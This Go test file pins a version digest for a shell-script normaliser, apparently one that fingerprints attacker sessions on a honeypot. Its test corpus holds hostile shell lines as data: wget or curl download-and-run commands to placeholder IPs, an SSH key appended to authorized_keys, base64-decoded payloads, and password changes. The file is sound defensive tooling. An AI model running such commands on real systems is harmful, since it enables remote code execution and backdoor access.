package script

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"maps"
	"slices"
	"strings"
	"testing"
)

// versionPin ties the normaliser's observable output to Version. The digest
// covers, for a fixed hostile corpus, every value a stored script keeps:
// the encoding, Display, CommandCount, Distinctive and len(Tokens), plus
// each segment's program() (which decides Distinctive) and the constants
// and tables that shape tokens, programs and families. If this test fails:
//
//   - you changed an encoding or one of those values: bump script.Version,
//     extend its history comment, then set versionPin to the new Version and
//     the digest the failure prints;
//   - you bumped Version: set versionPin to match.
//
// Never update only the digest: without a bump, stored sessions and new
// sessions of one script fingerprint differently forever.
var versionPin = struct {
	version int
	digest  string
}{5, "43e7da1e8aa6b99459bb70d8ae29951a083581fe355957c65d05dccaeef820d4"}

// versionCorpus has, for every normalisation rule, at least one input
// whose encoding, Display, CommandCount, Distinctive or per-segment
// programs depend on that rule; recon-only scripts check program detection
// through Distinctive, and the programs are pinned directly as well. When
// you add a rule, add an input here that it changes (the re-review found
// five rules the first corpus could not see).
var versionCorpus = []string{
	// Plain, placeholders as whole tokens.
	`uname -s -v -n -r -m`,
	`cd /tmp; wget http://1.2.3.4/x.sh; sh x.sh`,
	`curl -s 10.0.0.9:8080/a|bash; chmod 777 /tmp/kxhqwe; /tmp/kxhqwe`,
	`echo deadbeefdeadbeefdeadbeef 123456 12345 aGVsbG8gV29ybGQgMTIzNDU2Nzg5MA== abc123def`,
	`echo 0123456789abcde 0123456789abcdef 1234567890123456 123456789012345`, // hexRe's 16 boundary
	// Keys: a real blob, a non-key AAAA run, and keyTypeWords.
	`echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC/47d8xbCuUjYsBrxtmLjL4FDUe3BPIemNktjPY mdrfckr" >> .ssh/authorized_keys`,
	`echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKBT1fubDzcjP8Ntf33MZwaTgCpwTQRaj7IrSvXO0lBU k" ed25519 nistp256`,
	`echo "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | base64 -d > x`,
	// Quoted text: markerRe, randomInside, hexIn and numIn boundaries,
	// typed \n, real newline and CR, URL/IP/tmp inside quotes.
	`echo a1b2c a1b2c3 "a1b2c" "a1b2c3" 'vT' "abcd" "abcde" "root\ndp75z0biqzBE\ndp75z0biqzBE" | passwd`,
	"echo \"root:123456789\" \"pin 12345\" \"k=0123456789abcdef x\" \"k=0123456789abcde x\"",
	"echo \"a\nb\" \"c\r\" \"d\\ne\" \"http://x/y 1.2.3.4:80/p /tmp/zz\"",
	`echo "<url>" '<key>' "a<b http://x/y>c" "\http://x/y"`,
	"echo `wget http://x/y`; echo `cat /tmp/kxq`; echo `curl 1.2.3.4/a`",
	// Wrappers: every wrapper and option form, the unknown-option stop.
	`nice -n 5 python3 x; nice -19 python3 y; nice --adjustment=3 python3 z`,
	`sudo -u root -- wget x; sudo -E -s python3 a; sudo --user=root python3 b; sudo --weird python3 c; sudo -Z python3 d`,
	`timeout -s 9 30 python3 x; timeout --kill-after=5 30s python3 y; env -i A=1 python3 z; env -u X python3 w`,
	`stdbuf -oL python3 x; stdbuf -o L python3 y; exec -a n python3 z; command -p python3 w; time -p python3 v`,
	`nohup python3 x; busybox python3 y; x=1 python3 z; command -v wget; type python3; hash perl`,
	// Recon-only scripts: each must stay non-Distinctive.
	`nice -n 5 id; timeout 3 uname -a; sudo -u root whoami; w; uptime`,
	`2>/dev/null id; >/dev/null uname -a; w; uptime; whoami`,
	`command -v wget; command -V curl; type python3; hash perl; id; uname -a`,
	`'id'; "uname" -a; 'w'; 'ls'; 'ps'`,
	`{ id; w; uname -a; uptime; }`,
	`if id; then uname -a; else w; fi; uptime; whoami`,
	`while w; do uptime; done; until id; do ls; done; ! whoami`,
	`for i in 1 2; do id; done; case $x in a) w;; esac; [[ -f x ]] && ls; select y in a; do id; done; function f`,
	`0</dev/null uname -a; id; w; uptime; whoami`,
	`echo x >| /tmp/a; id 3<> /tmp/b; w; uptime; whoami`,
	"0<<EOF id\nx\nEOF\nw; uptime; whoami; uname",
	"cat <<EOF\nid\nw\nuptime\nwhoami\nls\nEOF",
	// Distinctive through a <url> or <key> anywhere in a token.
	"cat <<EOF > /tmp/a\nhttp://x/y\nEOF\nid; w; uptime; whoami",
	`echo "a<b http://x/y"; id; w; uptime; whoami`,
	// Redirections and their targets.
	`uname -a 2>&1; whoami >/dev/null 2>&1; x &> f; y &>> g; z >> h; 2>> i id`,
	`> /tmp/a python3 x; 2>/dev/null python3 y; < /tmp/kxhqwe python3; > abc123def python3`,
	`>& f id; >&/tmp/a id; <&0 id; id 2>&-; <& f id; id <&3; id 2>&1 & wget x`,
	`> $(evil) python3; > $(a $(b)) python3; 2>/tmp/$(date) wget x; > $(evil python3`,
	"> $(a\nwget x; > $(a; b) python3; > f (id)",
	`<<< x python3 y; <<< abc123def python3; 2<<<x python3; base64 -d <<< "Zm9v" | sh`,
	`a && b || c | d & e ; f`,
	// Heredoc delimiters: every quoting and escape form bash applies.
	"cat <<\\EOF > /tmp/a.sh\nwget http://1.1.1.1/a; chmod +x a\nEOF\nsh /tmp/a.sh; rm -f /tmp/a.sh",
	"cat <<E\"O F\" x\nb\nEO F\nid",
	"cat <<E\\ OF x\nb\nE OF\nid",
	"cat <<E\\\nOF x\nb\nEOF\nid",
	"cat <<\"E\\\"O\\$\\x\" x\nb\nE\"O$\\x\nid",
	"cat <<$'E\\x41\\101\\u00e9\\cA\\n\\'' x\nb\nEAAé\x01\nid",
	"cat <<$'E\\x41' x\nb\nE\\x41\nEA\nid",
	"cat <<$\"EOF\" x\nb\nEOF\nid",
	"cat <<'E'\"O\"\\F$'' x\nb\nEOF\nid",
	"cat <<\"E\\`F\\\nG\" x\nb\nE`FG\nid",
	"cat <<\"EOF\nb\nEOF\nid",
	"cat <<'EOF\nb\nEOF\nid",
	"cat <<$'EOF\nb\nEOF\nid",
	// Heredoc bodies and terminators.
	"cat <<-\"E O F\" <<B\n\tbody\n\tE O F\nb\nB\nid",
	"cat <<EOF\r\nbody\r\nEOF\r\nid",
	"cat <<EOF\n  EOF\nid\nEOF\nwhoami",
	"cat <<EOF\nEOF\nid\nwget http://x/y",
	"cat <<EOF\n\nEOF\nid",
	"cat <<EOF\nbody\nEOF trailing\nwget http://x/y\nEOF\nid",
	"cat <<EOF\n<nl><more> \"q\" 'r\nEOF\nid",
	"cat <<EOF\nno terminator\nid",
	"cat <<EOF python3\nbody\nEOF\n<<EOF python3 x\nbody\nEOF",
	"sudo <<EOF -u root python3\nbody\nEOF",
	"<<EOF python3 x\n" + strings.Repeat("y", 5000) + "\nEOF",
	"cat <<EOF\n" + strings.Repeat("\n", 3000) + "EOF\nid",
	"cat <<EOF\n" + strings.Repeat("<", 2000) + "\n" + strings.Repeat("\r", 3000) + "\nEOF\nid",
	"cat << ; id",
	// Bash word syntax (Version 5): comments, escapes, continuations,
	// mid-word quotes, backticks, ${...} and $(...) inside double quotes.
	"#!/bin/sh\nid; w # c 'x\nuptime; a#b",
	`echo "\"   x" ; echo a\;b \<<E "a\"b"`,
	"ec\\\nho a \\\n#x\nP\\\n1 x >\\\n> f; x'a b'y \\wget \"i\"d",
	"echo `a ' b` ${x:-a;b} ${x:-'}'} \"$(echo ')\"')\" \"$(case a in a) echo \"q\";; esac)\"",
	"cat <<EOF\nE\\\nOF\nid\ncat <<EOF\nx\\\\\nEOF\nw",
	// Heredoc delimiters holding substitutions, and $'...' escapes.
	"cat <<$(x)\nhello\n$(x)\npython3 z",
	"cat <<`x`\nb\n`x`\nid; cat <<${x}y\nb\n${x}y\nw; cat <<$((1+2))\nb\n$((1+2))\nuptime",
	"cat <<$'\\c?\\c\\\\\\ca' x\nb\n\x7f\x1c\x01\nid",
	"cat <<$'\\U00110000\\ud800\\U80000000' x\nb\n\xf4\x90\x80\x80\xed\xa0\x80\nid",
	"cat <<$'a\\c@b' x\nb\na\nid",
	"cat <<$'a\\?\\c1' x\nb\na?\x11\nid",
	"echo \"$(case a in a) echo '\"';; esac)\"\nP1 z\necho 'q'",
	"cat <<$'\\U04000000\\U0001F6000' x\nb\n\xfc\x84\x80\x80\x80\x80\xf0\x9f\x98\x800\nid",
	// Control bytes and CRLF.
	"wget\rhttp://x/y; echo a\x1fb\x1ec\fd",
	"cat <<EOF\nb\nEOF\r\npython3 x",
	"cat <<EOF\r\nb\r\nEOF\r\nid\r\n",
	// Arithmetic, tests and no-ops; quoted against unquoted heredocs.
	"(( i++ )); [ -d /tmp ] && cd /tmp; :; true; false; test x; sleep 1; ((id); w)",
	"cat <<'EOF'\n$(id)\nEOF\ncat <<EOF\n$(id)\nEOF",
	// Separators and hostile bytes.
	"\x00\xff'\"\x1e\x1f 2>&1 &>>x",
	strings.Repeat("a ; ", 400),
	"echo a\nwhoami",
}

func TestVersionPinsEncoding(t *testing.T) {
	h := sha256.New()
	fmt.Fprintf(h, "consts %v %v %v %v\n", FamilyThreshold, MaxDistanceTokens, minLengthRatio, MaxHeredocBodyBytes)
	for _, m := range []map[string]bool{recon, reserved, noProgram} {
		fmt.Fprintf(h, "words %q\n", slices.Sorted(maps.Keys(m)))
	}
	for _, name := range slices.Sorted(maps.Keys(wrappers)) {
		fmt.Fprintf(h, "wrapper %s %+v\n", name, *wrappers[name]) // fmt sorts map keys
	}
	var lines []string
	for _, s := range versionCorpus {
		enc := EncodeLine(s)
		cmds := Split(Join([]string{enc}))
		var progs []string
		for _, seg := range segments(cmds) {
			progs = append(progs, program(seg))
		}
		fmt.Fprintf(h, "%q %q %q %d %v %q %d\n", enc, Display(enc, 120), Display(enc, 0), CommandCount(cmds), Distinctive(cmds), progs, len(Tokens(enc)))
		lines = append(lines, enc)
	}
	all := Join(lines)
	fmt.Fprintf(h, "script %s %d\n", Fingerprint(all), len(Tokens(all)))
	got := hex.EncodeToString(h.Sum(nil))
	switch {
	case Version != versionPin.version:
		t.Fatalf("script.Version is %d but versionPin says %d: set versionPin to {%d, %q}", Version, versionPin.version, Version, got)
	case got != versionPin.digest:
		t.Fatalf("the normaliser's output changed without a script.Version bump: bump script.Version, extend its history, and set versionPin to {Version, %q}", got)
	}
}
